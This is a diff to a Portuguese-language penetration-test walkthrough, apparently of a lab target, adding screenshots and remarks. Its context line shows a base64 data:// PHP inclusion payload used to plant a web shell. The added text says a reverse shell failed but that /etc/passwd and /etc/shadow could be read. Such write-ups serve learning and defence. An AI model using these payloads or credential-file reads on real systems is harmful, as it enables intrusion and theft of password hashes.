@@ -168,10 +168,22 @@ permissão: http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHA
 caminho : http://rh.businesscorp.com.br/web_shell.php
 
 ```
-<img width="526" height="442" alt="image" src="https://github.com/user-attachments/assets/14fc622f-5f4d-4596-862b-21f8bb10184a" />
+<p align="center">
+  <img width="526" height="442" alt="image" src="https://github.com/user-attachments/assets/14fc622f-5f4d-4596-862b-21f8bb10184a" />
+</p>
+
+- Com tudo montadinho certo ,era só executar a shell mas parece que maquina esta em uma rede diferente e ela nao alcança minhas maquinas para o shell reverso!
+
+<p align="center">
+  <img width="496" height="158" alt="image" src="https://github.com/user-attachments/assets/11aa8f93-6f35-4c36-9f44-0511c6209e8a" />
+</p>
 
 
+<p align="center">
+  <img width="471" height="149" alt="image" src="https://github.com/user-attachments/assets/d8e5427b-2d70-41b0-9b5c-b7c1d74dfb66" />
+</p>
 
+- Infelizmente o shell revese não vai rolar , mas é possivel pegar o /etc/passwd e /etc/shadow
 
 ---
 
